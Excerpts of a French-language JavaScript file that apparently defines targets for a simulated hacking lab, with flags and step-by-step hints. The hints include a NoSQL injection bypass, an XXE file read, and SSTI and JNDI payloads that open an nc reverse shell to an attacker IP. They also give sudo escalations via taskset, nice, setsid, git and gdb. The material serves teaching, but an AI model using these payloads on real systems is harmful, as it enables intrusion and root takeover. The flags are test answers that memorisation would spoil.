...
const MACHINES = [
  ...
  // ─────────────────────────────────────────────────────────────────
  {
    ...
    difficulty: "Moyen",
    os: "Linux (Debian 12)",
    briefing: "Une API interne de ticketing, dopée à MongoDB. Le formulaire de connexion accepte des objets JSON un peu trop confiants dans les entrées utilisateur.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 3000, proto: "tcp", state: "open", service: "http", version: "Aether Ticketing API (Node.js / Express + MongoDB)" },
    ],
    web: {
      "/": "<html>\n<head><title>Aether Ticketing</title></head>\n<body>\n<h1>Aether Ticketing API</h1>\n<p>Authentification : POST /api/login (JSON)</p>\n<!-- doc rapide : /api/docs -->\n</body>\n</html>",
      "/api/docs": "Aether Ticketing API v1\n\nPOST /api/login\nBody JSON attendu : { \"user\": \"<login>\", \"pass\": \"<mot de passe>\" }\n\n(note interne : le pilote MongoDB n'échappe pas les opérateurs de requête envoyés depuis le body -- a corriger)",
    },
    ftp: { enabled: false },
    // Injection NoSQL : le backend transmet directement les champs du corps JSON à une
    // requête MongoDB (`db.users.find({user: body.user, pass: body.pass})`). Si le champ
    // "pass" contient un opérateur de requête (ex. {"$ne": null}) au lieu d'une chaîne,
    // Mongo l'interprète comme une condition -- le contrôle de mot de passe saute entièrement.
    // Détection volontairement simple : on cherche un opérateur Mongo classique dans le body.
    nosqli: {
      path: "/api/login",
      injectionRegex: /\$ne|\$gt|\$exists|\$regex|\$in\b/i,
      successBody:
        '{"status":"ok","message":"Connexion admin reussie (bypass NoSQL sur le champ pass).",' +
        '"note":"Identifiants SSH de secours (rotation en attente) : tbernard / Aeth3r_N0sql_Byp4ss!"}',
      failBody: '{"status":"error","message":"Identifiants invalides."}',
    },
    sshUsers: {
      tbernard: { password: "Aeth3r_N0sql_Byp4ss!" },
    },
    targetFS: {
      hostname: "aether",
      homeDir: "/home/tbernard",
      users: {
        tbernard: {
          home: "/home/tbernard",
          fs: {
            "user.txt": { type: "file", content: "FLAG{aether_acces_initial_nosqli_bypass}", perms: "-rw-r-----", owner: "tbernard" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "tbernard" },
            "notes.txt": { type: "file", content: "Pense-bête : sudo -l m'autorise taskset en NOPASSWD. Ça sert à épingler un process sur un cœur CPU... et accessoirement, GTFOBins en fait tout autre chose.", perms: "-rw-r--r--", owner: "tbernard" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nUn admin s'étonne que la base MongoDB de l'API ait été migrée en urgence juste après le dernier rapport de R. Kade. Personne ne veut dire pourquoi le contrôle des mots de passe a été laissé \"temporairement\" permissif.", perms: "-rw-r--r--", owner: "tbernard" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur tbernard peut lancer les commandes suivantes sur aether :\n    (root) NOPASSWD: /usr/bin/taskset",
    },
    privesc: {
      type: "sudo-direct",
      // DSL d'exploit : sudo `taskset 1 /bin/sh` (GTFOBins) -- épingle un shell sur un cœur CPU et le lance en root
      exploit: { tool: "sudo", bin: "taskset 1", spawn: "/bin/sh" },
      enterMsg: "# (shell root obtenu via taskset -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{aether_root_taskset_gtfobins}" },
    hints: {
      recon: [
        "Cette API accepte des identifiants au format JSON -- regarde bien comment le body est construit.",
        "Après `nmap 10.10.11.90`, lis `curl http://10.10.11.90/` puis `curl http://10.10.11.90/api/docs` : le format attendu par /api/login est précisé, ainsi qu'un indice sur le pilote MongoDB.",
        "Le commentaire de la doc dit que les opérateurs de requête MongoDB envoyés dans le body ne sont pas filtrés.",
      ],
      access: [
        "Une injection NoSQL classique remplace un champ texte par un objet contenant un opérateur MongoDB, par exemple `{\"$ne\": null}` -- \"différent de null\" est presque toujours vrai.",
        "Envoie ça en POST avec curl : `curl -d '{\"user\":\"admin\",\"pass\":{\"$ne\":null}}' http://10.10.11.90/api/login`.",
        "La réponse fuite des identifiants SSH de secours. Connecte-toi avec `ssh tbernard@10.10.11.90`.",
      ],
      privesc: [
        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas évidente au premier abord.",
        "`taskset` sert normalement à épingler un processus sur un CPU précis -- mais GTFOBins référence une façon de l'utiliser pour lancer un shell.",
        "Lance `sudo taskset 1 /bin/sh` pour obtenir un shell root.",
      ],
    },
  },
  ...
  // ─────────────────────────────────────────────────────────────────
  {
    ...
    difficulty: "Difficile",
    os: "Linux (Debian 12)",
    briefing: "Un générateur de rapports internes. Le nom personnalisé passé en paramètre est injecté tel quel dans un moteur de templates côté serveur.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 8081, proto: "tcp", state: "open", service: "http", version: "Eclipse ReportGen (Python / Jinja2)" },
    ],
    web: {
      "/": "<html>\n<head><title>Eclipse ReportGen</title></head>\n<body>\n<h1>Eclipse ReportGen</h1>\n<p>Génération de rapport personnalisé.</p>\n<!-- essai : /report?name=... -->\n<!-- TODO: échapper le paramètre avant de le passer au moteur de rendu -->\n</body>\n</html>",
    },
    ftp: { enabled: false },
    // Server-Side Template Injection : le paramètre `name` est interpolé directement dans
    // un template Jinja2 côté serveur au lieu d'être passé comme simple variable. Une
    // expression `{{ ... }}` est donc évaluée par le moteur -- jusqu'à l'exécution de
    // commandes via les objets globaux exposés par le framework (vecteur réel et classique).
    ssti: {
      path: "/report",
      param: "name",
      pocRegex: /^\{\{\s*7\s*\*\s*7\s*\}\}$/,
      pocResponse: "Aperçu du rapport pour : 49\n(le moteur de templates a évalué l'expression -- confirmation d'une SSTI)",
      injectRegex: /\{\{.*nc\s+\d+\.\d+\.\d+\.\d+\s+\d+.*\}\}/i,
      user: "rpasquier",
    },
    sshUsers: {},
    targetFS: {
      hostname: "eclipse",
      homeDir: "/home/rpasquier",
      users: {
        rpasquier: {
          home: "/home/rpasquier",
          fs: {
            "user.txt": { type: "file", content: "FLAG{eclipse_acces_initial_ssti_rce}", perms: "-rw-r--r--", owner: "rpasquier" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "rpasquier" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLe moteur de templates du générateur de rapports a été ajouté juste avant le départ forcé de R. Kade. Elle avait déjà flaggé le rendu \"trop permissif\" dans un brouillon jamais envoyé.", perms: "-rw-r--r--", owner: "rpasquier" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur rpasquier peut lancer les commandes suivantes sur eclipse :\n    (root) NOPASSWD: /usr/bin/nice",
    },
    privesc: {
      type: "sudo-direct",
      // DSL d'exploit : sudo `nice /bin/sh` (GTFOBins) -- nice relance simplement le programme donné, avec les droits sudo
      exploit: { tool: "sudo", bin: "nice", spawn: "/bin/sh" },
      enterMsg: "# (shell root obtenu via nice -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{eclipse_root_nice_gtfobins}" },
    hints: {
      recon: [
        "Le générateur de rapports accepte un nom personnalisé en paramètre -- regarde bien ce que le commentaire du code source en dit.",
        "Après `nmap 10.10.11.195`, lis `curl http://10.10.11.195:8081/` : un commentaire pointe vers `/report?name=...` et prévient que le paramètre n'est pas échappé avant le rendu.",
        "Teste une expression de calcul entre doubles accolades pour voir si elle est évaluée côté serveur : `curl \"http://10.10.11.195:8081/report?name={{7*7}}\"`.",
      ],
      access: [
        "Si le rapport affiche 49 au lieu de `{{7*7}}` littéral, le moteur de templates évalue bien ton expression -- c'est une SSTI (Server-Side Template Injection).",
        "Une SSTI permet souvent d'aller jusqu'à l'exécution de commandes via les objets internes exposés par le framework. Mets-toi d'abord en écoute : `nc -lvnp 4444`.",
        "Déclenche le rappel : `curl \"http://10.10.11.195:8081/report?name={{ os.popen('nc 10.10.14.1 4444 -e /bin/sh').read() }}\"` (même port des deux côtés). Tu obtiens un shell rpasquier.",
      ],
      privesc: [
        "`sudo -l` une fois connecté : une seule commande NOPASSWD.",
        "`nice` relance simplement le programme donné en argument, avec les droits sudo hérités -- GTFOBins l'utilise pour lancer un shell root direct.",
        "Lance `sudo nice /bin/sh` pour obtenir un shell root.",
      ],
    },
  },
  ...
  // ─────────────────────────────────────────────────────────────────
  {
    ...
    difficulty: "Difficile",
    os: "Linux (Debian 12)",
    briefing: "Un service interne d'import de documents. Il accepte du XML brut... et le parseur est resté sur sa configuration par défaut, entités externes comprises.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
      { port: 8090, proto: "tcp", state: "open", service: "http", version: "Vesper DocImport (Java / SAX parser)" },
    ],
    web: {
      "/": "<html>\n<head><title>Vesper DocImport</title></head>\n<body>\n<h1>Vesper DocImport</h1>\n<p>Import de documents XML pour le service compta.</p>\n<!-- POST /api/import — XML brut uniquement, pas de multipart -->\n<!-- TODO: désactiver la résolution des entités externes (DTD) avant la prod -->\n</body>\n</html>",
    },
    ftp: { enabled: false },
    // XXE (XML External Entity) : le parseur XML côté serveur résout les entités externes
    // déclarées dans la DTD du document envoyé. Une entité `SYSTEM "file://<chemin>"` fait
    // donc lire un fichier arbitraire du serveur et l'injecte dans la réponse — un vecteur de
    // divulgation de fichier réel et classique quand la résolution DTD n'est pas désactivée.
    // Détection : on exige que l'entité cible exactement le fichier "secret" de la machine.
    xxe: {
      path: "/api/import",
      secretPath: "/etc/vesper/service.conf",
      entityRegex: /<!ENTITY\s+\w+\s+SYSTEM\s+["']file:\/\/([^"']+)["']\s*>/i,
      successBody:
        "<result>\n  <status>ok</status>\n  <content># /etc/vesper/service.conf\nSSH_USER=kbrennan\nSSH_PASS=V3sper_XXE_L34k!63\n(fichier injecte via l'entite externe resolue par le parseur XML)</content>\n</result>",
      notFoundBody: "<result>\n  <status>error</status>\n  <message>Entite externe resolue, mais fichier introuvable a ce chemin.</message>\n</result>",
      failBody: "<result>\n  <status>error</status>\n  <message>Document XML invalide ou aucune entite externe detectee.</message>\n</result>",
    },
    sshUsers: {
      kbrennan: { password: "V3sper_XXE_L34k!63" },
    },
    targetFS: {
      hostname: "vesper",
      homeDir: "/home/kbrennan",
      users: {
        kbrennan: {
          home: "/home/kbrennan",
          fs: {
            "user.txt": { type: "file", content: "FLAG{vesper_acces_initial_xxe_file_disclosure}", perms: "-rw-r-----", owner: "kbrennan" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "kbrennan" },
            "notes.txt": { type: "file", content: "Pense-bête : sudo -l m'autorise setsid en NOPASSWD. Je m'en sers pour détacher des jobs de leur terminal... en théorie.", perms: "-rw-r--r--", owner: "kbrennan" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLe service d'import compta tourne encore avec la configuration XML par défaut du framework. R. Kade l'avait comparé à \"laisser la porte de derrière grande ouverte\" dans un rapport que personne n'a lu jusqu'au bout.", perms: "-rw-r--r--", owner: "kbrennan" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur kbrennan peut lancer les commandes suivantes sur vesper :\n    (root) NOPASSWD: /usr/bin/setsid",
    },
    privesc: {
      type: "sudo-direct",
      // DSL d'exploit : sudo `setsid /bin/sh` (GTFOBins) -- lance le shell dans une nouvelle session, avec les droits sudo hérités
      exploit: { tool: "sudo", bin: "setsid", spawn: "/bin/sh" },
      enterMsg: "# (shell root obtenu via setsid -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{vesper_root_setsid_gtfobins}" },
    hints: {
      recon: [
        "Ce service accepte des documents XML en entrée -- pense à ce qu'un parseur XML mal configuré peut faire avec des entités externes.",
        "Après `nmap 10.10.11.162`, lis `curl http://10.10.11.162:8090/` : un commentaire précise l'endpoint d'import et prévient que la résolution DTD n'a pas été désactivée.",
        "Une XXE (XML External Entity) permet de déclarer une entité `SYSTEM \"file://<chemin>\"` dans la DTD d'un document XML : le parseur va lire ce fichier et l'injecter dans le document traité.",
      ],
      access: [
        "Construis un document XML avec une DTD interne déclarant une entité externe, puis référence-la dans le corps du document.",
        "Le fichier de configuration du service est un bon candidat pour une XXE de divulgation de fichier -- essaie `/etc/vesper/service.conf`.",
        "Envoie-le en POST : `curl -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/vesper/service.conf\">]><r>&x;</r>' http://10.10.11.162:8090/api/import`. La réponse fuite des identifiants SSH.",
      ],
      privesc: [
        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas la plus évidente.",
        "`setsid` lance un programme dans une nouvelle session -- GTFOBins l'utilise pour obtenir un shell root direct puisqu'il hérite des droits sudo.",
        "Lance `sudo setsid /bin/sh` pour obtenir un shell root.",
      ],
    },
  },
  ...
  // ─────────────────────────────────────────────────────────────────
  {
    ...
    difficulty: "Moyen",
    os: "Linux (Ubuntu 22.04)",
    briefing: "Un service interne de génération de rapports, encore en version de développement. Le dossier `.git` du dépôt a été déployé par erreur en même temps que l'application.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1 Ubuntu" },
      { port: 80, proto: "tcp", state: "open", service: "http", version: "Relic Reports (dev build)" },
    ],
    web: {
      "/": "<html>\n<head><title>Relic Reports</title></head>\n<body>\n<h1>Relic Reports (dev build)</h1>\n<p>Environnement de préproduction — ne pas utiliser en production.</p>\n<!-- déploiement effectué avec rsync depuis le dossier de travail, dossier .git inclus par erreur -->\n</body>\n</html>",
      "/.git/HEAD": "ref: refs/heads/main\n",
      "/.git/config": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n[remote \"origin\"]\n\turl = git@git.solenne-holdings.local:internal/relic-reports.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
    },
    ftp: { enabled: false },
    // Dépôt .git exposé par erreur avec l'application déployée : l'historique complet des
    // commits est donc accessible, y compris ceux qui ont depuis été "corrigés" -- un
    // secret retiré dans un commit ultérieur reste parfaitement lisible dans l'ancien diff.
    // Simulé en dur (`gitLeak.commits`), sans vrai parsing d'objets git compressés.
    gitLeak: {
      commits: [
        {
          hash: "1a2b3c4d5e6f7089a1b2c3d4e5f60718293a4b5c",
          message: "Initial commit: scaffold reporting service",
          diff: "diff --git a/README.md b/README.md\nnew file mode 100644\n+++ b/README.md\n+# Relic Reports\n+Service interne de génération de rapports (dev build).",
        },
        {
          hash: "2b3c4d5e6f70819a2b3c4d5e6f7081920a3b4c5d",
          message: "Add deploy script",
          diff: "diff --git a/deploy.sh b/deploy.sh\nnew file mode 100755\n+++ b/deploy.sh\n+#!/bin/bash\n+rsync -av ./build/ prod:/srv/relic/",
        },
        {
          hash: "3c4d5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6",
          message: "WIP: config file for staging env",
          diff: "diff --git a/config/staging.yml b/config/staging.yml\nnew file mode 100644\n+++ b/config/staging.yml\n+env: staging\n+db_host: 127.0.0.1",
        },
        {
          hash: "4d5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6f7",
          message: "oops: hardcoded ssh creds for the demo, will remove before merge",
          diff: "diff --git a/config/staging.yml b/config/staging.yml\n+++ b/config/staging.yml\n+ssh_user: gkessler\n+ssh_pass: R3lic_G1t_H1st0ry!41",
        },
        {
          hash: "5e6f7081920a3b4c5d6e7f8091a2b3c4d5e6f708",
          message: "fix: remove hardcoded creds from staging.yml",
          diff: "diff --git a/config/staging.yml b/config/staging.yml\n-ssh_user: gkessler\n-ssh_pass: R3lic_G1t_H1st0ry!41\n+# creds now injected via CI secret at deploy time",
        },
        {
          hash: "6f7081920a3b4c5d6e7f8091a2b3c4d5e6f70819",
    ...
    sshUsers: {
      gkessler: { password: "R3lic_G1t_H1st0ry!41" },
    },
    targetFS: {
      hostname: "relic",
      homeDir: "/home/gkessler",
      users: {
        gkessler: {
          home: "/home/gkessler",
          fs: {
            "user.txt": { type: "file", content: "FLAG{relic_acces_initial_git_history_leak}", perms: "-rw-r-----", owner: "gkessler" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "gkessler" },
            "notes.txt": { type: "file", content: "Pense-bête : sudo -l m'autorise git en NOPASSWD -- pratique pour consulter des diffs en root sans mot de passe. GTFOBins en pense autre chose.", perms: "-rw-r--r--", owner: "gkessler" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLe dossier .git a été déployé par erreur sur trois environnements différents depuis le début de l'année. R. Kade l'avait signalé la première fois -- et les deux suivantes aussi, sans succès.", perms: "-rw-r--r--", owner: "gkessler" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur gkessler peut lancer les commandes suivantes sur relic :\n    (root) NOPASSWD: /usr/bin/git",
    },
    privesc: {
      type: "sudo-gtfobins",
      // DSL d'exploit : sudo sur `git`, qui ouvre un pager (GTFOBins) exactement comme less/man.
      exploit: { tool: "sudo", bin: "git", pager: true },
      pagerEscapeRegex: /^!\/?(bin\/)?sh$|^!bash$/,
      enterMsg: "(le pager git s'est ouvert avec les droits root -- même mécanique que less/man)\n\nAstuce : depuis le pager, échappe vers un shell avec !sh",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{relic_root_git_gtfobins}" },
    hints: {
      recon: [
        "Le site précise que le déploiement se fait par simple copie du dossier de travail -- vérifie ce qui a pu partir avec.",
        "Essaie `curl http://10.10.11.140/.git/HEAD` : si ça répond, le dépôt entier est exposé, pas seulement ce fichier.",
        "Un dépôt `.git` exposé se navigue avec les commandes dédiées `git log <ip>` et `git show <ip> <hash>` (simulées, pas un vrai clone).",
      ],
      access: [
        "`git log 10.10.11.140` liste tous les commits -- lis bien les messages, l'un d'eux s'excuse presque de son contenu.",
        "Un commit qui dit \"sera retiré avant le merge\" mérite un `git show` : le contenu original reste lisible dans l'historique même après un commit correctif.",
        "`git show 10.10.11.140 <hash>` (les premiers caractères du hash suffisent) affiche le diff complet -- un des commits fuite des identifiants SSH en clair.",
      ],
      privesc: [
        "`sudo -l` une fois connecté : une seule commande NOPASSWD, en lien avec le sujet de la machine.",
        "`git` ouvre un pager quand on lui demande de l'aide (`git -p help config`) -- la même mécanique GTFOBins que less/man.",
        "Lance `sudo git -p help config`, puis `!sh` dans le pager pour obtenir un shell root.",
      ],
    },
  },
  ...
  // ─────────────────────────────────────────────────────────────────
  {
    ...
    difficulty: "Difficile",
    os: "Linux (Ubuntu 22.04)",
    briefing: "Un service de journalisation centralisée pour l'infra interne. Il logue consciencieusement chaque en-tête de requête... y compris ceux qui ne devraient jamais être évalués.",
    ports: [
      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1 Ubuntu" },
      { port: 8081, proto: "tcp", state: "open", service: "http", version: "Echolog Ingest (Java / bibliothèque de logs non patchée)" },
    ],
    web: {
      "/": "<html>\n<head><title>Echolog Ingest</title></head>\n<body>\n<h1>Echolog Ingest</h1>\n<p>Point d'entrée de journalisation centralisée. Toute requête sur /api/status est loguée telle quelle (en-têtes compris).</p>\n<!-- ticket ouvert depuis 4 mois : mettre à jour la lib de logs (CVE connue) -->\n</body>\n</html>",
    },
    ftp: { enabled: false },
    // Injection JNDI façon Log4Shell : la bibliothèque de logs évalue un lookup
    // `${jndi:ldap://...}` trouvé dans un en-tête de requête (ici User-Agent) au lieu de
    // le traiter comme une simple chaîne à journaliser. Vecteur réel et tristement
    // célèbre (CVE-2021-44228). Simplifié comme les autres RCE du lab : le callback
    // `nc <ip> <port>` est parsé directement depuis le payload du joueur.
    jndi: {
      path: "/api/status",
      header: "user-agent",
      injectRegex: /\$\{jndi:(?:ldap|ldaps|rmi):\/\/[^}]*\}/i,
      user: "svc_logger",
    },
    sshUsers: {},
    targetFS: {
      hostname: "echolog",
      homeDir: "/home/svc_logger",
      users: {
        svc_logger: {
          home: "/home/svc_logger",
          fs: {
            "user.txt": { type: "file", content: "FLAG{echolog_acces_initial_jndi_rce}", perms: "-rw-r--r--", owner: "svc_logger" },
            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "svc_logger" },
            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLa mise à jour de la bibliothèque de logs traîne depuis le départ précipité de R. Kade -- elle avait pourtant classé le ticket en priorité critique, en rouge, souligné deux fois.", perms: "-rw-r--r--", owner: "svc_logger" },
          },
        },
      },
      extraFS: {},
      sudoL: "L'utilisateur svc_logger peut lancer les commandes suivantes sur echolog :\n    (root) NOPASSWD: /usr/bin/gdb",
    },
    privesc: {
      type: "sudo-direct",
      // DSL d'exploit : commande exacte GTFOBins pour gdb (échappement vers un shell via son mode commande).
      exploit: { tool: "sudo", bin: "gdb", raw: "sudo gdb -nx -ex '!sh' -ex quit" },
      enterMsg: "# (shell root obtenu via gdb -- technique GTFOBins)",
    },
    rootFile: { path: "/root/root.txt", content: "FLAG{echolog_root_gdb_gtfobins}" },
    hints: {
      recon: [
        "Le commentaire du code source avoue lui-même que la bibliothèque de logs n'est pas à jour -- pense à une CVE célèbre sur l'évaluation de lookups dans les logs.",
        "L'endpoint `/api/status` journalise les en-têtes de la requête tels quels, y compris `User-Agent` -- un terrain connu pour ce genre de faille.",
        "Un lookup `${jndi:ldap://...}` glissé dans un en-tête peut être évalué côté serveur au lieu d'être simplement écrit dans un fichier de log (façon Log4Shell, CVE-2021-44228).",
      ],
      access: [
        "Mets-toi d'abord en écoute : `nc -lvnp 4444`.",
        "Le lookup JNDI accepte d'embarquer un callback vers ta machine -- vise ton IP d'attaquant et le port en écoute.",
        "Envoie `curl -H 'User-Agent: ${jndi:ldap://10.10.14.1:1389/x;nc 10.10.14.1 4444 -e /bin/sh}' http://10.10.11.205:8081/api/status` (même port des deux côtés, guillemets simples obligatoires pour ne pas déclencher l'expansion de variable du shell). Tu obtiens un shell svc_logger.",
      ],
      privesc: [
        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas franchement anodine à autoriser sans mot de passe.",
        "`gdb` peut exécuter une commande shell depuis son interpréteur de commandes avec `!sh` -- GTFOBins en fait un raccourci direct vers un shell root.",
        "Lance `sudo gdb -nx -ex '!sh' -ex quit` pour obtenir un shell root.",
      ],
    },
  },
...
function validateMachines(machines) {
  ...
  machines.forEach((m, i) => {
    ...
    if (m.jndi && (!m.jndi.path || !(m.jndi.injectRegex instanceof RegExp) || !m.jndi.user)) {
      errors.push(`${tag} : "jndi" incomplet (path/injectRegex/user requis)`);
    }
    if (m.gitLeak && (!Array.isArray(m.gitLeak.commits) || !m.gitLeak.commits.length)) {
      errors.push(`${tag} : "gitLeak" incomplet (commits non vide requis)`);
    } else if (m.gitLeak) {
      m.gitLeak.commits.forEach((c, j) => {
        if (!c.hash || !/^[0-9a-f]{16,}$/.test(c.hash)) errors.push(`${tag} : gitLeak.commits[${j}].hash invalide`);
        if (!c.message) errors.push(`${tag} : gitLeak.commits[${j}].message manquant`);
        if (!c.diff) errors.push(`${tag} : gitLeak.commits[${j}].diff manquant`);
      });
    }
  });
  return errors;
